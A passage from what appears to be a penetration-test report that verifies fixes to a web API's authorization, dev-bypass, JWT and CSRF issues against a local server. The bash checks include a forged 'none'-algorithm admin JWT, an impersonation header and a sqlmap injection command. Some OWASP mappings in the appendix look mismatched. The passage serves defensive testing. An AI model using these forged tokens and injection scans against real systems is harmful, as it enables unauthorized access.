### PEN-002 (Financial Auth) — Verification

```bash
# Should now return 403 for member role
STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
  http://localhost:4000/v1/financial/dashboard \
  -H "X-Dev-User-Id: dev-member-id")
[ "$STATUS" = "403" ] && echo "[PASS] Financial route properly restricted" || echo "[FAIL] Still returns $STATUS"
```

### PEN-003 (Dev Bypass) — Verification

```bash
# Set NODE_ENV=production and test
NODE_ENV=production node backend/src/app.js &
sleep 2
STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
  http://localhost:4000/v1/auth/me \
  -H "X-Dev-User-Id: dev-org_admin-id")
[ "$STATUS" = "401" ] && echo "[PASS] Dev bypass correctly blocked in production" || echo "[FAIL] Still returns $STATUS"
pkill -f "node backend/src/app.js"
```

### PEN-004 (JWT Secret) — Verification

```bash
# Check that JWT_SECRET is not the placeholder
node -e "
const secret = process.env.JWT_SECRET || require('./backend/src/config').jwt.secret;
const isWeak = ['dev-secret-change-in-production-min-32-chars',
                 'replace-with-random-secret-min-32-chars',
                 'secret', 'development'].includes(secret);
const isLong = secret && secret.length >= 32;
console.log(isWeak ? '[FAIL] Weak/default secret in use' : '[PASS] Secret is not a known placeholder');
console.log(isLong ? '[PASS] Secret length >= 32 chars' : '[FAIL] Secret too short');
"
```

### PEN-005 (CSRF) — Verification

```bash
# After CSRF token implementation — verify state-change endpoint requires token
STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
  -X PATCH http://localhost:4000/v1/members/some-id/role \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $VALID_TOKEN" \
  -d '{"role":"viewer"}')
# Without CSRF token header, should return 403
[ "$STATUS" = "403" ] && echo "[PASS] CSRF token required" || echo "[FAIL] Endpoint accepts requests without CSRF token ($STATUS)"
```

### PEN-006 (JWT Claims) — Verification

```bash
# Test none-algorithm attack
NONE_JWT="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJkZXYtbWVtYmVyLWlkIiwib3JnX2lkIjoiZGV2LW9yZy1pZCIsInJvbGUiOiJvcmdfYWRtaW4ifQ."
STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
  http://localhost:4000/v1/financial/dashboard \
  -H "Authorization: Bearer $NONE_JWT")
[ "$STATUS" = "401" ] && echo "[PASS] none-algorithm attack rejected" || echo "[FAIL] none-algorithm accepted ($STATUS)"
```

---

## Appendix A — Useful Commands Reference

```bash
# Generate a strong JWT_SECRET
openssl rand -hex 32

# Decode a JWT without verifying (inspection only)
echo "BASE64_PAYLOAD" | base64 -d | jq '.'

# Inspect JWT claims using jwt_tool
python3 jwt_tool.py <token>

# sqlmap safe-mode on export endpoint (injection testing)
sqlmap -u "http://localhost:4000/v1/exports/tasks" \
  --data='{"format":"csv","filters":{"status":"*"}}' \
  --method=POST \
  --headers="Content-Type: application/json\nX-Dev-User-Id: dev-org_admin-id" \
  --level=1 --risk=1 --batch

# Burp Suite proxy configuration
# Set JVM: java -Dhttp.proxyHost=127.0.0.1 -Dhttp.proxyPort=8080
# curl proxy: curl --proxy http://127.0.0.1:8080 ...
```

## Appendix B — OWASP Testing Guide References

| Finding | OWASP Testing Guide Reference |
|---|---|
| OTP brute-force (PEN-001) | WSTG-AUTHN-003 — Testing for Weak Lock Out Mechanism |
| Financial authz (PEN-002) | WSTG-ATHZ-001 — Testing Directory Traversal/File Include |
| Dev bypass (PEN-003) | WSTG-CONF-007 — Testing HTTP Methods |
| JWT cracking (PEN-004) | WSTG-SESS-003 — Testing for Session Token Predictability |
| CSRF (PEN-005) | WSTG-SESS-005 — Testing for Cross-Site Request Forgery |
| JWT claim manipulation (PEN-006) | WSTG-SESS-010 — Testing JSON Web Tokens |
